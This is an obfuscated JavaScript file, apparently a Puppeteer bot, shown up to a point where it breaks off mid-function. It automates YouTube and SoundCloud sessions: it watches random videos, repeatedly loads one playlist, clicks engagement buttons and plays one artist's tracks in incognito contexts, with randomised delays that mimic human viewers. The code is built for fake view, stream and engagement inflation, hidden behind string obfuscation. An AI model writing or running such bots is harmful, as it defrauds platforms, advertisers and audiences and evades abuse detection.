const Z = d,
  Y = c,
  X = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1 * 0x2b1 + 0xc55 + -0xf05))) + i;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2073 + 0x19d3 * -0x1 + -0x6a0);
    let h = e[f];
    if (b['yxJddd'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1a67 + 0x1220 + 0x847, s, t, u = -0x1 * -0xf6 + -0xfe2 + 0xeec; t = n['charAt'](u++); ~t && (s = r % (0x4cf * -0x8 + -0x2b1 * -0x1 + 0x23cb) ? s * (0x2320 + -0x389 + -0x1f57) + t : t, r++ % (0xce8 + -0x104c + 0x368)) ? p += String['fromCharCode'](0xf85 * 0x2 + -0xac4 + -0x1347 & s >> (-(0x11c9 + 0x1 * -0x12b9 + 0xf2) * r & -0xf3f * 0x2 + 0x19fe + 0x243 * 0x2)) : 0x17c5 + 0x2 * -0xa3f + 0x1 * -0x347) {
          t = o['indexOf'](t);
        }
        for (let v = -0x6c0 + 0x189 + -0x537 * -0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x2495 + 0x1 * 0x1406 + 0x109f))['slice'](-(-0xe * 0x35 + -0x2 * -0x44f + -0x5b6));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x225c + -0x1847 + -0x3aa3 * -0x1,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x7 * 0x1d + -0xc * -0x2c7 + 0x2089 * -0x1; u < 0x10aa + -0x1604 + 0x21e * 0x3; u++) {
          p[u] = u;
        }
        for (u = -0x419 * -0x2 + -0x223 * -0x3 + -0xe9b; u < -0x14a2 + -0x69 * 0x17 + -0xb * -0x2d3; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1ee5 + -0xe98 + 0x3 * 0xf7f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1283 + -0x26e3 + 0x3966, q = -0x1308 + -0x9b4 * -0x3 + -0x1ae * 0x6;
        for (let v = 0x578 + -0x7f6 + 0x27e; v < n['length']; v++) {
          u = (u + (0x1 * 0x1ad1 + 0x7 * 0x3d + 0x17 * -0x13d)) % (-0x736 + 0x3f0 * 0x7 + 0x9ad * -0x2), q = (q + p[u]) % (0x6 * 0x50a + 0x1 * -0x108f + -0xcad), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x22e5 + 0x11c1 + -0x12 * -0x102)]);
        }
        return t;
      };
      b['dOfSSY'] = m, c = arguments, b['yxJddd'] = !![];
    }
    const j = e[0x1 * 0x1b1f + 0x10a0 * -0x1 + -0xa7f],
      k = f + j,
      l = c[k];
    return !l ? (b['exOqML'] === undefined && (b['exOqML'] = !![]), h = b['dOfSSY'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x2320 + -0x389 + -0x1f97), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x4d71 + -0x61c8 + 0x8987 + (0x1f0a * 0x3 + -0x204d + -0x239) * random()) : await standardWaitForNetIdle(f), await wait(0x11c9 + 0x1 * -0x12b9 + 0x1478 + (-0x1e7e * 0x2 + 0x33fb + 0x99d * 0x5) * random()), 0x17c5 + 0x2 * -0xa3f + 0x2 * -0x1a3;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x6c0 + 0x189 + -0x18bf * -0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x2495 + 0x1 * 0x1406 + 0x1090;
}
async function randomWait() {
  return await wait(-0xe * 0x35 + -0x2 * -0x44f + 0xdd0 + (-0x225c + -0x1847 + -0x4e2b * -0x1) * random()), -0x7 * 0x1d + -0xc * -0x2c7 + 0xad8 * -0x3;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x10aa + -0x1604 + 0x112 * 0x5, -0x419 * -0x2 + -0x223 * -0x3 + -0xe94), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0xf790 + -0x2e7 * 0x27 + -0x83 * -0x48b) * getRandomInt(-0x1ee5 + -0xe98 + 0x13 * 0x265, -0x1283 + -0x26e3 + 0x396b), h)), -0x1308 + -0x9b4 * -0x3 + -0xa13 * 0x1;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = b,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x578 + -0x7f6 + 0x27e;
    i = i['split'](i[R(0x0, ')urQ')]('of') ? '\x20of\x20' : ',\x20')[0x1 * 0x1ad1 + 0x7 * 0x3d + 0x17 * -0x13d]['split']('\x20');
    for (let k = -0x736 + 0x3f0 * 0x7 + 0x209 * -0xa; k < i['length']; k += 0x6 * 0x50a + 0x1 * -0x108f + -0xdab)
      j += i[k] * h[i[k + (-0x22e5 + 0x11c1 + -0x13 * -0xe7)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1 * 0x1b1f + 0x10a0 * -0x1 + -0xa79)['map'](l => Array['from'](l['children']))['flat'](-0x77c * 0x4 + 0x1515 + -0x8dc * -0x1)['map'](l => l['childNodes'][-0x1 * -0x20e3 + 0x27 * -0x94 + -0xa56]['childNodes'][-0xac8 + -0x2 * 0xf6d + 0x14d1 * 0x2]['childNodes'][0x1844 * 0x1 + -0x1478 + 0x1 * -0x3cb]['childNodes'][0x7 * 0x16d + 0x212b * 0x1 + 0x1 * -0x2b26]['childNodes'][0x1066 + -0x17a7 + 0x742]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1567 + 0x440 + 0x1 * 0x150f, 0x469 + 0x78c + -0x793 * -0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x61b1 + 0x4cbd + 0x6 * 0xd42);
  const h = await getMaxTime(f),
    i = Math['min']((-0xd * -0x137 + 0x62d7 + 0x77be) * getRandomInt(0x1 * -0x479 + -0x8e3 + 0x76 * 0x1d, -0x1904 + -0x1 * -0x1821 + 0x1 * 0xe8), h);
  return await wait(i), 0x3e5 * 0x5 + 0x6b2 + -0xc5 * 0x22;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1 * -0x15d4 + 0x217c + -0xba8]['children'][0x1f0c + 0x2228 + -0x4134]['children'][-0x1 * 0x1273 + 0x1656 + -0x3e3]['children'][-0xc2 * -0x1d + 0x12db + -0x1 * 0x28d5]['children'][0x1 * 0x859 + 0x1a2b * -0x1 + 0x11d2]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0xd * 0x152 + 0x1cd * 0x7 + -0x1dc4;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x5 * -0x5de + 0x4 * -0x14 + 0x5ba * -0x5 + (0x3 * -0x280 + -0xa8 * -0x2 + 0x2b * 0x26) * random()
  }), await wait(0x624 + 0x230e + 0x273e * -0x1 + (0xffd * -0x1 + -0x1289 + 0x23b2) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x8b * -0x2f + 0xb * 0x190 + 0x283 * -0x11]['childNodes'][0x859 * 0x3 + -0x20ab + 0x7a1]['childNodes'][0x1302 + 0x123a + -0x3 * 0xc69]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1ecb + 0x1c8d * -0x1 + 0x1 * 0x3b5d]['childNodes'][-0x2 * 0x89a + 0x7d7 * 0x1 + -0x33 * -0x2f]['childNodes'][0x272 * 0x5 + 0x5f7 + -0x122f]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x5 * -0x449 + -0x3bc + -0x11b0),
          r = -0x1075 + 0x1 * -0x1a65 + -0x892 * -0x5;
        for (let u = 0x3 * 0xae4 + 0x15b0 * 0x1 + -0x365c; u < q['length']; u += -0xd * 0x12 + 0x639 * 0x1 + -0x54d)
          r += q[u] * k[q[u + (0x167 + -0xa50 + 0x8ea)]];
        return r;
      }(n);
  });
  await wait((-0x55c1 * 0x1 + 0x46c6 + 0x4993) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0xfc2 * -0x10 + 0x4244 + -0x5404) * getRandomInt(-0x209d + 0x379 * 0x1 + -0x33d * -0x9, 0x1edb + -0x1516 + -0x2f * 0x35), h + (0x12c * -0x19 + 0x1555 * -0x1 + 0x4629));
  return await wait(i), 0x13c0 + -0xda * -0x1a + 0x29e3 * -0x1;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2073 + 0x19d3 * -0x1 + -0x6a0);
    let h = e[f];
    return h;
  }, d(b, c);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2073 + 0x19d3 * -0x1 + -0x6a0);
    let h = e[f];
    if (c['FjBIEb'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1a67 + 0x1220 + 0x847, r, s, t = -0x1 * -0xf6 + -0xfe2 + 0xeec; s = m['charAt'](t++); ~s && (r = q % (0x4cf * -0x8 + -0x2b1 * -0x1 + 0x23cb) ? r * (0x2320 + -0x389 + -0x1f57) + s : s, q++ % (0xce8 + -0x104c + 0x368)) ? o += String['fromCharCode'](0xf85 * 0x2 + -0xac4 + -0x1347 & r >> (-(0x11c9 + 0x1 * -0x12b9 + 0xf2) * q & -0xf3f * 0x2 + 0x19fe + 0x243 * 0x2)) : 0x17c5 + 0x2 * -0xa3f + 0x1 * -0x347) {
          s = n['indexOf'](s);
        }
        for (let u = -0x6c0 + 0x189 + -0x537 * -0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x2495 + 0x1 * 0x1406 + 0x109f))['slice'](-(-0xe * 0x35 + -0x2 * -0x44f + -0x5b6));
        }
        return decodeURIComponent(p);
      };
      c['xHLmqK'] = i, b = arguments, c['FjBIEb'] = !![];
    }
    const j = e[-0x225c + -0x1847 + -0x3aa3 * -0x1],
      k = f + j,
      l = b[k];
    return !l ? (h = c['xHLmqK'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function keyWatch(f) {
  const S = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x89 * 0x31 + -0xd0d + 0x3 * -0x464), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f[S(0xd)]('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x1a67 * 0x1 + 0x21af + 0x29 * -0x12e + (0x180e + -0xb47 + 0x1 * -0x8df) * Math['random']());
    });
  }, -0xce7 + -0x2b96 + -0x1 * -0x53d5);
  await wait(0x34483 * 0x1 + 0x5 * -0xf58a + -0xf9 * -0x647);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1 * -0x4687 + -0x6c0 + 0x137a7) * getRandomInt(0x1b37 + -0xc04 + 0xa9 * -0x17, -0x55f * -0x7 + 0x9d + 0xb * -0x377)), clearInterval(h), 0xfe9 * -0x2 + 0x19e3 + 0x5f0;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1 * 0x1d45 + -0x1726 + 0x346b;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x336 + 0x1d3 * 0xa + -0xf07 * 0x1;
    await randomWait();
  }
  return 0xb5f + 0x7 * 0x44b + -0x296b;
}

function fetchRandomSC() {
  return Math['random']() <= 0x59 * 0x2b + 0x341 + -0x4 * 0x48d + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x140f + 0x169f * -0x1 + 0x2aae + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x9f8 + -0x1 * 0x104e + -0x656 * -0x1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x4a * 0x6d + -0xc6 * 0x19 + -0xc2c;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const T = d;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + T(0x7) + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0xbfd5 + 0x2 * -0xfef + 0x18f7b + getRandomInt(-0x6fd7 + 0x5a66 + 0x5009, 0x2217 * -0x3 + 0xea20 + 0x5 * -0x2ef));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x57b * 0x6 + 0x33 * -0x89 + -0x1e17 * -0x2), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1751 + 0x2b * -0x7b + 0x2bfa;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x2626 + -0x1ad + -0x1 * -0x27d3, 0x1 * 0x20b9 + -0x265c + -0x5d5 * -0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1 * 0xe50 + 0xdd5 * 0x1 + 0x84b + floor((0x1 * -0x1459 + -0xe06 + 0x1 * 0x2647) * random()))), log('p2'), log(await s['evaluate'](() => {
        const U = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xabc0ca0a + 0xcbefe11a + 0x1a6b976 * -0x96),
          0xa3a862 + 0x85bbd1 + -0xa96433,
          -0x7f * 0xb5 + 0xa * 0x691 + 0x9821,
          -0x2455 + -0x4f6 + 0x29cb
        ], y = [
          0x10b1 * 0x1 + 0x11 * 0xf6 + 0x1 * -0x20ef,
          0xb74 + -0x5e1 * 0x5 + -0x1 * -0x1201,
          0xb03 + -0x7 * 0x215 + -0x2e * -0x14,
          0x1e91 + -0xfa3 + -0xeee
        ], z = [
          'hex',
          'array',
          U(0x8),
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x3c6 + 0x22a6 * 0x1 + -0x1edf)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1436 + -0x11f8 + 0x262e; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x3fe + -0x8a4 + 0xca2) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1 * 0x4e1 + -0x5d * 0x1c + -0x1 * -0xf0d] = A[-0x9f0 * -0x1 + -0x81d + -0xb * 0x29] = A[-0x147 + -0x14c6 + 0x160e] = A[-0x23 * 0xba + -0x1e6 * 0xe + 0x3404] = A[-0x1835 + 0xdcb + 0xa6d] = A[-0x1576 + -0x13 * 0x1d + 0x17a1] = A[-0xc17 + -0x252c + 0x3148] = A[-0x12a3 + 0x269b + -0x13f2] = A[-0x505 * -0x6 + -0x25 * 0xd + 0x9d * -0x2e] = A[0x1400 + 0x1aab + -0x2ea3] = A[-0x8fd * 0x1 + 0x126a + 0x2 * -0x4b2] = A[-0x1d98 + -0x3 * -0x167 + 0x17 * 0x11b] = A[-0x1 * 0x1e69 + -0x1 * -0xb4e + -0x3 * -0x662] = A[-0x2 * 0xb92 + -0x1caf + -0x10f * -0x31] = A[-0x127f * -0x1 + -0x57 * 0x22 + 0x6 * -0x126] = A[-0xb2f + 0x1c24 + -0x1 * 0x10e7] = A[-0xe43 * -0x2 + -0xb * 0x32b + -0x56 * -0x13] = 0x232b + 0xe7e + 0x31a9 * -0x1, this['blocks'] = A) : this['blocks'] = [
                -0x13e1 + 0x1d5d + -0x97c,
                -0x1e20 + -0xc3e + 0x2a5e,
                0x23 * 0x7 + 0x1321 * 0x1 + -0x1416 * 0x1,
                0x1318 * 0x1 + -0x1a5a + 0x742,
                0x1efb + -0x815 * 0x1 + -0x16e6,
                0x1 * -0x13f1 + 0x1772 * -0x1 + 0x1 * 0x2b63,
                -0xc60 + -0x1 * -0x1cea + -0x108a,
                0x1b83 + 0x16c4 + -0x3247,
                -0x66 * 0xb + -0x24c3 + 0x1 * 0x2925,
                0x11ae + -0x9e6 + -0x7c8,
                0x15ec * 0x1 + 0x1db6 + -0x33a2,
                -0xc36 + -0x1 * -0x1979 + 0x1e5 * -0x7,
                -0x1120 + -0xc9d * 0x3 + 0x1 * 0x36f7,
                -0x95c * 0x4 + -0x1400 * 0x1 + 0x3970,
                0x24c + 0x8 * -0xab + 0x30c,
                -0x223 * 0x2 + 0x373 * 0x1 + -0xd3 * -0x1,
                0x7 * -0x28e + 0x267d + -0x41f * 0x5
              ], this['h0'] = 0x7d498b31 + 0x388a5db1 * 0x1 + -0x4e8ec5e1, this['h1'] = -0x26e00ddc + 0x1 * -0x153f608e9 + 0x13551e127 * 0x2, this['h2'] = -0x11c887ca4 + -0xf7d3abae + -0x130 * -0x240eaf7, this['h3'] = -0x1713f0bc + 0x1 * 0xa39bc97 + 0x1d0c889b, this['h4'] = 0x24048d5 + 0x4ce5 * -0x4dc8a + 0x23764d88d, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1a5 * 0x17 + -0x18b4 + -0x1 * -0x3e87, this['finalized'] = this['hashed'] = 0x1275 + 0x277 * -0x9 + -0x6a * -0x9, this['first'] = -0x2129 + -0xf31 * 0x2 + 0x3f8c;
            }
            ['update'](J) {
              const V = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x150 + -0xc3b + 0xd8b, O = J['length'] || -0x778 + 0x1874 + -0x10fc, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x38c + 0x172e + -0x1aba, P[-0x18f9 * 0x1 + -0x1 * 0x1c7c + -0x73 * -0x77] = this['block'], P[-0x2 * -0x8ed + 0xef * 0x1f + -0x2ebb] = P[-0x18f3 + 0x2 * -0xaae + 0xc * 0x3dc] = P[0x13dc + 0x1921 * -0x1 + 0x547 * 0x1] = P[-0x1b02 + 0x8c5 + 0x1 * 0x1240] = P[0x195a + 0x3 * -0x399 + -0xe8b] = P[0xdb * 0x1 + -0x1c * 0x55 + 0x169 * 0x6] = P[0x1a * 0xfa + 0xa * -0x248 + -0x28e] = P[0x2268 + 0x1cd5 + -0xa89 * 0x6] = P[-0xa67 + -0x11c5 * -0x2 + -0x191b] = P[0x209f + 0x19d7 + 0x3a6d * -0x1] = P[0x221 + -0x10ea * 0x1 + 0xed3] = P[0x12b5 * 0x2 + -0x1be8 + -0x977] = P[0x1 * 0xc6d + 0x221 + -0xe82] = P[0xd38 + 0x1f7e + 0x1 * -0x2ca9] = P[-0x321 + 0x3 * 0x949 + -0xc56 * 0x2] = P[-0x6fd * 0x5 + -0xef * -0x23 + 0x253] = -0x8 * -0x18f + 0x60 * 0x1b + 0x3 * -0x788), K) {
                    for (N = this['start']; M < O && N < 0x1e53 + -0xea + -0x1d29; ++M)
                      P[N >> -0x1e8a + 0xa73 + 0x1419] |= J[M] << y[-0x57 * 0x51 + -0x1fd * 0x13 + -0x2d7 * -0x17 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x24de + 0xe7c + -0x331a; ++M)
                      (L = J['charCodeAt'](M)) < 0x10cf * -0x1 + 0x1c0 + 0xf8f ? P[N >> 0x1d6c + 0xb * -0x194 + -0x1 * 0xc0e] |= L << y[-0x1a1f + 0x242 * 0xd + -0x338 & N++] : L < 0x5 * -0x4c7 + -0x519 + 0x24fc ? (P[N >> 0x4 * -0x57a + -0x2b * 0x59 + -0x24dd * -0x1] |= (0x55d * 0x7 + 0x3 * -0x439 + -0x1820 | L >> -0x2 * -0x727 + 0x21d5 + -0x301d * 0x1) << y[0x18b3 + -0x20b9 + 0x11 * 0x79 & N++], P[N >> 0x7 * 0x48b + 0x10ba + -0x3085] |= (0x1dd3 + -0x422 + -0x1931 | 0x77d * -0x3 + -0x26b6 + 0x3d6c & L) << y[-0x3 * -0x2bf + 0x17ca + -0x2004 & N++]) : L < 0x107e * 0x1 + -0x5de5 + -0x61cd * -0x3 || L >= -0x40 * -0x344 + 0x148 * -0x12d + 0x190a8 ? (P[N >> 0xef * -0x29 + 0x6f3 + -0x6 * -0x539] |= (-0x1de9 + 0x1 * 0x16a7 + -0x822 * -0x1 | L >> -0x9f3 + -0x217 * 0xe + 0x2741) << y[0x12b6 + -0xbbf + 0x1 * -0x6f4 & N++], P[N >> -0xebf * -0x1 + 0x1 * 0x156e + 0x2f * -0xc5] |= (0x3b7 * -0x6 + 0x196b + 0x2a1 * -0x1 | L >> 0xb3 * -0x1c + -0xc9b + 0x671 * 0x5 & -0x1bf * -0xf + 0x1fbb * 0x1 + -0x39ad) << y[0x1c57 + 0x1ad1 * -0x1 + 0x81 * -0x3 & N++], P[N >> 0x1 * 0x106 + 0x1f4b + 0xac5 * -0x3] |= (0x1d8f + -0x446 * -0x7 + -0x3af9 | -0x1f28 + 0x17f7 + 0x770 & L) << y[0x2dd * 0xb + -0x277 * -0x7 + -0x103f * 0x3 & N++]) : (L = 0x8c75 * -0x1 + -0xf1b3 + 0x27e28 + ((0x16ac + 0x9c + -0x1349 & L) << -0x87 * 0x6 + -0x557 * 0x1 + 0x1b * 0x51 | -0x161c + -0x1 * -0x2121 + -0x706 & J['charCodeAt'](++M)), P[N >> -0x1 * -0x1c7f + -0x1 * 0x1c88 + 0x1 * 0xb] |= (-0x242 + 0x382 * -0x7 + -0xc * -0x250 | L >> 0x656 * 0x1 + 0xca0 + -0x12e4) << y[0xcf * -0x21 + 0x1 * -0xb79 + 0x262b & N++], P[N >> -0x1207 + -0x25ba + 0x37c3] |= (-0x14b4 + -0x218a + -0x4fa * -0xb | L >> -0x2058 + 0x4b6 * -0x2 + 0x14e8 * 0x2 & -0x3ec + -0x1007 + 0xa19 * 0x2) << y[0x254a + 0x17da * -0x1 + 0x1 * -0xd6d & N++], P[N >> -0x1eb9 + 0x12af + -0x6 * -0x202] |= (0x1c40 + 0x83d + -0x23fd | L >> 0xe99 + 0x5 * -0xfc + 0x9a7 * -0x1 & 0x2 * -0xd81 + -0x2 * -0x11c0 + -0x83f) << y[0x1f61 + 0x761 * 0x1 + -0x26bf & N++], P[N >> 0x11bd + -0x26b9 + 0x14fe] |= (-0x2047 * -0x1 + 0x1b5e + -0x3b25 | -0x1559 * -0x1 + 0xf8d * -0x2 + 0x20 * 0x50 & L) << y[0x25f * 0x3 + 0xb4 + -0x7ce & N++]);
                  }
